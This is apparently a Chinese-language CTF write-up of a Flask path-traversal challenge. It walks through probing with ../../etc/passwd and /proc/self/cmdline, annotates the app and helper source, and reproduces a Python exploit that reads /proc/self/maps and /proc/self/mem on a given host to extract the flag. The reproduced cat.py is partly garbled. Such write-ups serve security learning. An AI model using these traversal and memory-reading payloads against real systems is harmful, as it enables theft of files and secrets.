## 实题笔记  
**任意文件漏洞**  
**判断方法**  
- 出现使用?file=123.txt的url来展示内容
- 直接用?file=../../../etc/passwd直接检测


**查看文件源码**
- 使用?file=../../../proc/self/cmdline查看运行的程序
- 本题为app.py
- 不断调整”../“的数量，用相对路径打开它


**分析代码**
```python
#引入必要模块
import os			#系统操作
import uuid			#生成唯一标识符
from flask import Flask, request, session, render_template, Markup
					#构建web应用
from cat import     #自定义模块（文件读取）

#初始化flag
flag = ""

app = Flask(
    _name__,
    static_url_path='/', 	#静态文件URL路径设为根路径
    static_folder='static'	#静态文件存放目录为static文件夹
)


# 生成应用密钥字符串：（生成UUID并移除连字符“-”，再添加固定后缀"*abcdefgh"）
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"

#查看根目录下是否有名为flag的文件，若有读取并删除
if os.path.isfile("/flag"):
    flag = cat("/flag")
    os.remove("/flag")

# 针对/这个路径只允许get方法进入
@app.route('/', methods=['GET'])

def index():

    detailtxt = os.listdir('./details/')	# 列出details目录下的所有文件
    cats_list = []							# 创建一个数列（后面可以看出是储存文件夹名）

    for i in detailtxt:
        cats_list.append(i[:i.index('.')])	# 添加1.index的文件符号.前的文件,如123.txt,它会提取123
    
    return render_template("index.html", cats_list=cats_list, cat=cat)	# 传入两个数据cats——list和cat

# 同理限定进入方法
@app.route('/info', methods=["GET", 'POST'])

def info():
			# 构建文件路径："./details/" + 用户提供的file参数
			# 这也是漏洞来源，使用相对路径跳过details
    filename = "./details/" + request.args.get('file', "")
			
			# 获取start和end参数，用于文件内容截取（默认值为"0"）
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")

     		# 从file参数中提取文件名（第一个点号之前的部分）
    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]
    
			# 渲染detail.html模板，传入猫咪名称和文件内容
    		# cat函数可能用于读取文件内容，支持start和end参数
    return render_template("detail.html", catname=name, info=cat(filename, start, end))

# 同理
@app.route('/admin', methods=["GET"])

# 这里是管理员内容，如果是管理员返回flag
def admin_can_list_root():

    if session.get('admin') == 1:
        return flag

    else:

        session['admin'] = 0
        return "NoNoNo"

if __name__ == '__main__':
    # 启动Flask应用
    app.run(host='0.0.0.0',  # 监听所有网络接口
            debug=False,     # 关闭调试模式（生产环境）
            port=5637)       # 监听5637端口
```

很容易看出我不会分析这一大串代码

所以根据答案可以知道要分析cat.py

得到
```python
mport os, sys, getopt


def cat(filename, start=0, end=0)->bytes:
 data = b''
 
 try:
	start = int(start)
	end = int(end)
 
 except:
	start=0
	end=0
 
 if filename != "" and os.access(filename, os.R_OK):
 f = open(filename, "rb")

 if start >= 0:
	f.seek(start)
	if end >= start and end != 0:
		data = f.read(end-start)
 
 else:
	data = f.read()
	
 else:
	data = f.read()
 
 f.close()
 
 else:
 data = ("File `%s` not exist or can not be read" % filename).encode()
 
 return data


if __name__ == '__main__':
 opts,args = getopt.getopt(sys.argv[1:],'-h-f:-s:-e:',['help','file=','start=','end='])
 fileName = ""
 start = 0
 end = 0
 
 for opt_name, opt_value in opts:
	if opt_name == '-h' or opt_name == '--help':
		print("[*] Help")
		print("-f --file File name")
		print("-s --start Start position")
		print("-e --end End position")
		print("[*] Example of reading /etc/passwd")
		print("python3 cat.py -f /etc/passwd")
		print("python3 cat.py --file /etc/passwd")
		print("python3 cat.py -f /etc/passwd -s 1")
		print("python3 cat.py -f /etc/passwd -e 5")
		print("python3 cat.py -f /etc/passwd -s 1 -e 5")
		exit()
	
	elif opt_name == '-f' or opt_name == '--file':
		fileName = opt_value
	
	elif opt_name == '-s' or opt_name == '--start':
		start = opt_value
	
	elif opt_name == '-e' or opt_name == '--end':
		end = opt_value
	
	if fileName != "":
		print(cat(fileName, start, end)) 
	
	else:
		print("No file to read")
```

然后答案里说了需要使用代码

```python
import requests
import re

baseUrl = "http://61.147.171.105:51973/info?file=../../../../.."

if __name__ == "__main__":
    url = baseUrl + "/proc/self/maps"
    memInfoList = requests.get(url).text.split("\\n")
    mem = ""
    for i in memInfoList:
        memAddress = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
        if memAddress:
            start = int(memAddress.group(1), 16)
            end = int(memAddress.group(2), 16)
            infoUrl = baseUrl + "/proc/self/mem&start=" + str(start) + "&end=" + str(end)
            mem = requests.get(infoUrl).text
            if re.findall(r"{[\w]+}", mem):
                print(re.findall(r"\w+{\w+}", mem))
```
然后就拿到flag了...
```
ctf{Catch_the_c4t_HaHa}
```
***

从那段我看不懂的代码重新搜索解析

（没错代码里的注释是现在补充的）

通过补充注释我充分理解了代码

**有关flag的信息：flag = cat("/flag")**

这表示cat函数很关键所以需要打开cat.py
